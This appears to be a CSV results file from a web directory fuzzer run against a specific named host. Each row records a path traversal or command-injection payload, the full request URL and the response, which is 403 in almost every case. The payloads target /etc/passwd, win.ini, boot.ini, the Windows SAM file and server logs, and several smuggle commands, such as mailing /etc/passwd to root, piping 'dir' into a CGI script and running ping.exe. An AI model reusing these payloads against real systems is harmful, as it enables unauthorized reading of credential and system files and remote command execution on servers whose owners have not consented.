FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,http://autodiscover.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,6.773109ms,
../config.js,http://autodiscover.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,7.138636ms,
../../../etc/passwd,http://autodiscover.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,9.127715ms,
./../../../../../../../../../etc/passw*,http://autodiscover.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,7.907087ms,
../../boot.ini,http://autodiscover.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,8.010867ms,
../../../logs/error.log,http://autodiscover.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,6.936824ms,
..///etc/passwd,http://autodiscover.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,7.944033ms,
file/../../../../../../../../etc,http://autodiscover.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,7.357461ms,
api/names.,http://autodiscover.officevibe.com/api/names.,,25186,404,1924,403,43,text/html; charset=utf-8,9.398678ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,http://autodiscover.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,7.214361ms,
./../../../../../../../../../etc/*,http://autodiscover.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,8.788689ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,http://autodiscover.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,7.359497ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,7.032883ms,
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,http://autodiscover.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,7.275566ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,http://autodiscover.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,9.698799ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,http://autodiscover.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,,36688,403,312,17,7,text/html; charset=us-ascii,7.480905ms,
../.passwd,http://autodiscover.officevibe.com/../.passwd,,37467,403,312,17,7,text/html; charset=us-ascii,7.97565ms,
../.pass,http://autodiscover.officevibe.com/../.pass,,37462,403,312,17,7,text/html; charset=us-ascii,8.579782ms,
info2www '(../../../../../../../bin/mail root </etc/passwd>,http://autodiscover.officevibe.com/info2www '(../../../../../../../bin/mail root </etc/passwd>,,38767,403,312,17,7,text/html; charset=us-ascii,8.133671ms,
../../../../../logs/access.log,http://autodiscover.officevibe.com/../../../../../logs/access.log,,38985,403,312,17,7,text/html; charset=us-ascii,11.670657ms,
"cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","http://autodiscover.officevibe.com/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,39476,403,312,17,7,text/html; charset=us-ascii,7.167774ms,
../../apache/logs/error.log,http://autodiscover.officevibe.com/../../apache/logs/error.log,,40906,403,312,17,7,text/html; charset=us-ascii,6.969799ms,
../../../logs/access.log,http://autodiscover.officevibe.com/../../../logs/access.log,,45696,403,312,17,7,text/html; charset=us-ascii,8.273691ms,
../../logs/access.log,http://autodiscover.officevibe.com/../../logs/access.log,,50318,403,312,17,7,text/html; charset=us-ascii,8.442968ms,
../../../../../logs/error.log,http://autodiscover.officevibe.com/../../../../../logs/error.log,,51110,403,312,17,7,text/html; charset=us-ascii,7.800093ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,http://autodiscover.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,52401,403,312,17,7,text/html; charset=us-ascii,7.617273ms,
..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,http://autodiscover.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,,52408,403,312,17,7,text/html; charset=us-ascii,10.953284ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,http://autodiscover.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,,53350,403,312,17,7,text/html; charset=us-ascii,14.264911ms,
cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,http://autodiscover.officevibe.com/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,53439,403,312,17,7,text/html; charset=us-ascii,8.100507ms,
static/..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/static/..%5c..%5cetc/passwd,,54184,403,312,17,7,text/html; charset=us-ascii,9.101971ms,
..//etc/passwd;index.html,http://autodiscover.officevibe.com/..//etc/passwd;index.html,,55856,403,312,17,7,text/html; charset=us-ascii,7.483863ms,
css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,http://autodiscover.officevibe.com/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,56912,403,312,17,7,text/html; charset=us-ascii,8.974861ms,
..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,57302,403,312,17,7,text/html; charset=us-ascii,7.695983ms,
cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,http://autodiscover.officevibe.com/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,57730,403,312,17,7,text/html; charset=us-ascii,7.469707ms,
//../../data/config/microsrv.cfg,http://autodiscover.officevibe.com///../../data/config/microsrv.cfg,,63058,403,312,17,7,text/html; charset=us-ascii,7.677379ms,
../../apache/logs/access.log,http://autodiscover.officevibe.com/../../apache/logs/access.log,,65127,403,312,17,7,text/html; charset=us-ascii,7.491742ms,
..\\..\\..\\..\\..\\..\\..\\boot.ini,http://autodiscover.officevibe.com/..\\..\\..\\..\\..\\..\\..\\boot.ini,,65982,403,312,17,7,text/html; charset=us-ascii,10.283667ms,
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,http://autodiscover.officevibe.com/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,67936,403,312,17,7,text/html; charset=us-ascii,7.470668ms,
static/..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/static/..%5c..%5c..%5cetc/passwd,,70464,403,312,17,7,text/html; charset=us-ascii,7.821668ms,
../webserver.ini,http://autodiscover.officevibe.com/../webserver.ini,,73462,403,312,17,7,text/html; charset=us-ascii,12.693547ms,
xyz/../../ThinVnc.ini,http://autodiscover.officevibe.com/xyz/../../ThinVnc.ini,,74299,403,312,17,7,text/html; charset=us-ascii,7.393842ms,
static/../../../a/../../../../etc/passwd,http://autodiscover.officevibe.com/static/../../../a/../../../../etc/passwd,,74451,403,312,17,7,text/html; charset=us-ascii,11.434905ms,
static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,77730,403,312,17,7,text/html; charset=us-ascii,8.599648ms,
..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/..%5c..%5c..%5c..%5cetc/passwd,,78884,403,312,17,7,text/html; charset=us-ascii,8.212563ms,
../../logs/error.log,http://autodiscover.officevibe.com/../../logs/error.log,,84935,403,312,17,7,text/html; charset=us-ascii,10.875077ms,
static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,88703,403,312,17,7,text/html; charset=us-ascii,6.896615ms,
